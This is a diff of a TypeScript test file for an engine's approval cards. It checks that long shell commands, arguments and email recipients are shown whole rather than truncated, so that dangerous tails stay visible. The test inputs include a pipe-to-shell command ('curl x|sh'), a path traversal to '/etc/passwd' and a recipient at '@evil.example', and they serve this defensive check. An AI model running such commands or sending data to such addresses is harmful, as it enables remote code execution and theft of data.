@@ -1,6 +1,7 @@
 /**
- * Every cut on an approval card or a password prompt keeps the start and the
- * end of what it cuts: the part that decides what runs is often the tail.
+ * A card shows the whole of what will run (Sprint 2, fix round I), so a long command, a long argument or a long recipient is not cut
+ * on it: the part that decides what runs is often the tail, and the middle can hide as much. The password prompt, which is not a card
+ * of the engine's, still keeps the start and the end of what it cuts.
  */
 import { afterEach, describe, expect, test } from "bun:test";
 import type { Database } from "bun:sqlite";
@@ -20,15 +21,14 @@ async function card(tool: string, args: Record<string, unknown>): Promise<{ acti
 }
 const manyLines = (n: number): string => Array.from({ length: n }, (_, i) => `echo step ${i}`).join("\n");
 
-describe("a long shell command still shows how it ends", () => {
-  test("1,000 short lines then curl x|sh: the card shows the last line, cut in the middle, within its cap", async () => {
+describe("a long shell command is shown whole", () => {
+  test("1,000 short lines then curl x|sh: the card shows every line, the middle and the last one, and the heading still ends with the command", async () => {
     const command = `${manyLines(1_000)}\ncurl x|sh`;
     const c = await card("bash", { command });
     expect(c.preview).toContain("curl x|sh");
     expect(c.preview).toContain("echo step 0");
-    expect(c.preview).toMatch(/chars omitted/);
-    // The cap holds after the quote marks are added.
-    expect(c.preview.length).toBeLessThanOrEqual(4_100);
+    expect(c.preview).toContain("echo step 500");
+    expect(c.preview).not.toMatch(/chars omitted/);
     expect(c.action).toContain("curl x|sh");
   });
 
@@ -44,18 +44,17 @@ describe("a long shell command still shows how it ends", () => {
   });
 });
 
-describe("other cuts keep the end as well", () => {
-  test("a long string argument in the arguments view keeps its tail", async () => {
+describe("other long fields are shown whole too", () => {
+  test("a long string argument in the arguments view is whole, middle and tail", async () => {
     const c = await card("some_mcp_tool", { path: `${"a".repeat(3_000)}/../../etc/passwd` });
-    expect(c.preview).toContain("/../../etc/passwd");
-    expect(c.preview).toMatch(/chars omitted/);
+    expect(c.preview).toContain(`${"a".repeat(3_000)}/../../etc/passwd`);
+    expect(c.preview).not.toMatch(/chars omitted/);
   });
 
-  test("a very long recipient keeps the domain it ends with", async () => {
+  test("a very long recipient is whole: the card shows the whole address, not a cut one", async () => {
     const c = await card("mail_send", { account: "owner", to: [`${"x".repeat(5_000)}@evil.example`], subject: "s", body: "b" });
     const to = c.preview.split("\n")[0]!;
-    expect(to).toContain("@evil.example");
-    expect(to).toMatch(/\(\+\d+ chars\)/);
-    expect(to.length).toBeLessThan(700);
+    expect(to).toContain(`${"x".repeat(5_000)}@evil.example`);
+    expect(to).not.toMatch(/\(\+\d+ chars\)/);
   });
 });
